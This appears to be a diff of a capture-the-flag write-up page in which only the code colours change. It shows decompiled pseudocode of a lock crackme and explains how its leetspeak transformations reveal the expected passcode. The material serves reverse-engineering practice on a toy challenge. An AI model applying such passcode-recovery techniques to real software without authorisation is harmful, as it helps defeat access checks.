 </span></span></code></pre></div><p>We can see that it takes our input, then replaces some values and compares it with the string <strong>&ldquo;master locks arent vry strong are they&rdquo;</strong></p>
 <p>These values in the <strong><strong><strong><strong><strong><strong>replace()</strong></strong></strong></strong></strong></strong> function are annoying so we are going to select them and press <strong><strong><strong><strong><strong><strong><strong><strong><strong>R</strong></strong></strong></strong></strong></strong></strong></strong></strong> (which will give us their Char value)</p>
 <p>The pseudocode now looks like this</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__cdecl</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">int</span> argc, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>argv, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>envp)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">40</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-30h] BYREF
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// [rsp+38h] [rbp-8h]
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">print_lock</span>(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Please enter the passcode: &#34;</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_fscanf</span>(_bss_start, <span style="color:#e6db74">&#34;%s&#34;</span>, s);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;The passcode you entered was: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, s);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;3&#39;</span>, <span style="color:#e6db74">&#39;e&#39;</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;_&#39;</span>, <span style="color:#e6db74">&#39; &#39;</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">&#39;o&#39;</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;4&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strlen</span>(s) <span style="color:#f92672">==</span> <span style="color:#ae81ff">38</span> )
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> s[<span style="color:#bd93f9">40</span>]; <span style="color:#6272a4">// [rsp+10h] [rbp-30h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v5; <span style="color:#6272a4">// [rsp+38h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>  v5 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">__readfsqword</span>(<span style="color:#bd93f9">0x28u</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">print_lock</span>(<span style="color:#f1fa8c">&#39;?&#39;</span>, <span style="color:#f1fa8c">&#39;?&#39;</span>, <span style="color:#f1fa8c">&#39;?&#39;</span>, <span style="color:#f1fa8c">&#39;?&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;Please enter the passcode: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">__isoc99_fscanf</span>(_bss_start, <span style="color:#f1fa8c">&#34;%s&#34;</span>, s);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;The passcode you entered was: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, s);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">replace</span>(s, <span style="color:#f1fa8c">&#39;3&#39;</span>, <span style="color:#f1fa8c">&#39;e&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">replace</span>(s, <span style="color:#f1fa8c">&#39;_&#39;</span>, <span style="color:#f1fa8c">&#39; &#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">replace</span>(s, <span style="color:#f1fa8c">&#39;0&#39;</span>, <span style="color:#f1fa8c">&#39;o&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">replace</span>(s, <span style="color:#f1fa8c">&#39;4&#39;</span>, <span style="color:#f1fa8c">&#39;a&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#50fa7b">strlen</span>(s) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">38</span> )
 </span></span><span style="display:flex;"><span>  {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(<span style="color:#e6db74">&#34;master locks arent vry strong are they&#34;</span>, s) )
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span><span style="color:#50fa7b">strcmp</span>(<span style="color:#f1fa8c">&#34;master locks arent vry strong are they&#34;</span>, s) )
 </span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;e&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>);
-</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;_&#39;</span>);
-</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;o&#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>);
-</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;4&#39;</span>);
-</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">unlock</span>(s);
+</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">replace</span>(s, <span style="color:#f1fa8c">&#39;e&#39;</span>, <span style="color:#f1fa8c">&#39;3&#39;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">replace</span>(s, <span style="color:#f1fa8c">&#39; &#39;</span>, <span style="color:#f1fa8c">&#39;_&#39;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">replace</span>(s, <span style="color:#f1fa8c">&#39;o&#39;</span>, <span style="color:#f1fa8c">&#39;0&#39;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">replace</span>(s, <span style="color:#f1fa8c">&#39;a&#39;</span>, <span style="color:#f1fa8c">&#39;4&#39;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">unlock</span>(s);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">else</span>
 </span></span><span style="display:flex;"><span>  {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Not quite!&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;Not quite!&#34;</span>);
 </span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>We can see that it takes our input, “unleetifies” it (replaces 3 with e, spaces with _, 4 with a and 0 with o), compares it with the passcode and then calls the <strong><strong><strong><strong><strong><strong><strong><strong>unlock()</strong></strong></strong></strong></strong></strong></strong></strong> function</p>
 <p>So, we just have to run the binary and enter the following passcode:</p>
